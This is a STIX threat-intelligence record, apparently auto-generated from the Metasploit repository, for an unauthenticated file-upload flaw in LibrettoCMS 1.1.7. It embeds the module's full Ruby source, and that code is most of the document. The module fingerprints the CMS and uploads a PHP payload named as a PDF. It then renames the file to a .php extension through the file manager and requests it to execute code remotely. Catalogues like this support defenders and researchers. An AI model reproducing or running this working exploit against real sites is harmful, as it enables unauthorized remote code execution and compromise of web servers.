{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d60d3bd0-95de-4dbf-b868-2d1ed8bf45e1",
    "created": "2024-08-14T17:12:15.690205Z",
    "modified": "2024-08-14T17:12:15.690209Z",
    "name": "\"LibrettoCMS File Manager Arbitary File Upload Vulnerability\"",
    "description": " This module exploits a file upload vulnerability found in LibrettoCMS 1.1.7, and possibly prior.  Attackers can bypass the file extension check and abuse the upload feature in order to upload a malicious PHP file without authentication, which results in arbitrary remote code execution.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/libretto_upload_exec.rb",
            "external_id": "libretto_upload_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::PhpEXE\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"LibrettoCMS File Manager Arbitary File Upload Vulnerability\",\n      'Description'    => %q{\n        This module exploits a file upload vulnerability found in LibrettoCMS 1.1.7, and\n        possibly prior.  Attackers can bypass the file extension check and abuse the upload\n        feature in order to upload a malicious PHP file without authentication, which\n        results in arbitrary remote code execution.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'CWH',\n          'sinn3r'  #Metasploit\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '94391'],\n          ['EDB', '26213']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\"\n        },\n      'Platform'       => %w{ linux php },\n      'Targets'        =>\n        [\n          [ 'Generic (PHP Payload)', { 'Arch' => ARCH_PHP, 'Platform' => 'php' }  ],\n          [ 'Linux x86'            , { 'Arch' => ARCH_X86, 'Platform' => 'linux'} ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-06-14',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path to LibrettoCMS', '/librettoCMS_v.2.2.2/'])\n      ])\n  end\n\n  def check\n    res = send_request_raw({'uri' => normalize_uri(target_uri.path)})\n    if not res\n      vprint_error(\"Connection timed out\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    if res.body =~ /Powered by <a href=\".+\">Libretto CMS/\n      return Exploit::CheckCode::Detected\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n\n  def upload(base)\n    p     = get_write_exec_payload(:unlink_self=>true)\n    fname = \"#{Rex::Text.rand_text_alpha(6)}.pdf\"\n\n    data = Rex::MIME::Message.new\n    data.add_part(fname, nil, nil, \"form-data; name=\\\"Filename\\\"\")\n    data.add_part(p, \"application/octet-stream\", nil, \"form-data; name=\\\"Filedata\\\"; filename=\\\"#{fname}\\\"\")\n    data.add_part('Submit Query', nil, nil, 'form-data; name=\"Upload\"')\n    post_data = data.to_s\n\n    uri = normalize_uri(base, 'adm', 'ui', 'js', 'ckeditor', 'plugins', 'pgrfilemanager', 'php', 'upload.php')\n\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => uri,\n      'ctype'    => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'     => post_data,\n      'vars_get' => {'type'=>'all files'}\n    })\n\n    if not res\n      fail_with(Failure::Unknown, \"#{peer} - Request timed out while uploading\")\n    elsif res.code.to_i != 200\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Unknown reply: #{res.code.to_s}\")\n    end\n\n    fname\n  end\n\n\n  def rename(base, original_fname)\n    new_name = \"#{Rex::Text.rand_text_alpha(5)}.pdf.php\"\n    uri = normalize_uri(base, 'adm', 'ui', 'js', 'ckeditor', 'plugins', 'pgrfilemanager', 'php', 'files.php')\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => uri,\n      'vars_get'  => { 'type' => 'all files' },\n      'vars_post' => {\n        'fun'         => 'renameFile',\n        'dir'         => '',\n        'filename'    => original_fname,\n        'newFilename' => new_name\n      }\n    })\n\n    if not res\n      fail_with(Failure::Unknown, \"#{peer} - Request timed out while renaming\")\n    elsif res.body !~ /\"res\":\"OK\"/\n      fail_with(Failure::Unknown, \"#{peer} - Failed to rename file\")\n    end\n\n    new_name\n  end\n\n\n  def exec(base, payload_fname)\n    res = send_request_cgi({ 'uri' => normalize_uri(base, 'userfiles', payload_fname) })\n    if res and res.code.to_i == 404\n      fail_with(Failure::NotFound, \"#{peer} - Not found: #{payload_fname}\")\n    end\n  end\n\n\n  def exploit\n    base = target_uri.path\n\n    print_status(\"Uploading malicious file...\")\n    orig_fname = upload(base)\n\n    print_status(\"Renaming #{orig_fname}...\")\n    new_fname = rename(base, orig_fname)\n\n    print_status(\"Executing #{new_fname}...\")\n    exec(base, new_fname)\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-06-14",
    "x_mitre_platforms": [
        "%w{ linux php }"
    ]
}